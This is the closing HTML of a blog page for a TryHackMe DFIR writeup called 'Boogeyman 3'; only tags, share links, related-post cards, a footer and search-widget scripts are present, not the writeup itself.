me-1"></i> <a href="/blog/ctf-writeups/">CTF Writeups</a>, <a href="/blog/tryhackme/">TryHackMe</a>, <a href="/blog/soc-1/">SOC 1</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/dfir/" class="post-tag no-text-decoration" >DFIR</a> <a href="/tags/phishing/" class="post-tag no-text-decoration" >Phishing</a> <a href="/tags/sysmon/" class="post-tag no-text-decoration" >Sysmon</a> <a href="/tags/elk/" class="post-tag no-text-decoration" >ELK</a> <a href="/tags/kibana/" class="post-tag no-text-decoration" >Kibana</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Boogeyman%203%20-%20Ibrahim%20EO.&url=%2Fposts%2Fboogeyman-3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Boogeyman%203%20-%20Ibrahim%20EO.&u=%2Fposts%2Fboogeyman-3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fboogeyman-3%2F&text=Boogeyman%203%20-%20Ibrahim%20EO." target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/linkvortex/">LinkVortex</a><li class="text-truncate lh-lg"> <a href="/projects/borderland/">Borderland</a><li class="text-truncate lh-lg"> <a href="/projects/chirpy-react/">Chirpy React</a><li class="text-truncate lh-lg"> <a href="/projects/attack-titan/">Shingeki</a><li class="text-truncate lh-lg"> <a href="/projects/passman/">PassMan</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a class="post-tag btn btn-outline-primary" href="/tags/elk/">ELK</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/kibana/">Kibana</a> <a class="post-tag btn btn-outline-primary" href="/tags/race-condition/">Race Condition</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/itsy-bitsy/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1729893600" data-df="ll" > Oct 26, 2024 </time><h4 class="pt-0 my-2">ItsyBitsy</h4><div class="text-muted"><p>Put your ELK knowledge together and investigate an incident.</p></div></div></a></article><article class="col"> <a href="/posts/boogeyman-2/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1730761200" data-df="ll" > Nov 5, 2024 </time><h4 class="pt-0 my-2">Boogeyman 2</h4><div class="text-muted"><p>The Boogeyman is back. Are you still afraid of the Boogeyman?</p></div></div></a></article><article class="col"> <a href="/posts/boogyman/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1730588400" data-df="ll" > Nov 3, 2024 </time><h4 class="pt-0 my-2">Boogeyman 1</h4><div class="text-muted"><p>A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/boogeyman-2/" class="btn btn-outline-primary" aria-label="Older" ><p>Boogeyman 2</p></a> <a href="/projects/chirpy-react/" class="btn btn-outline-primary" aria-label="Newer" ><p>Chirpy React</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/elomarii">Ibrahim El Omari</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >All rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.0.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a class="post-tag btn btn-outline-primary" href="/tags/elk/">ELK</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/kibana/">Kibana</a> <a class="post-tag btn btn-outline-primary" href="/tags/race-condition/">Race Condition</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
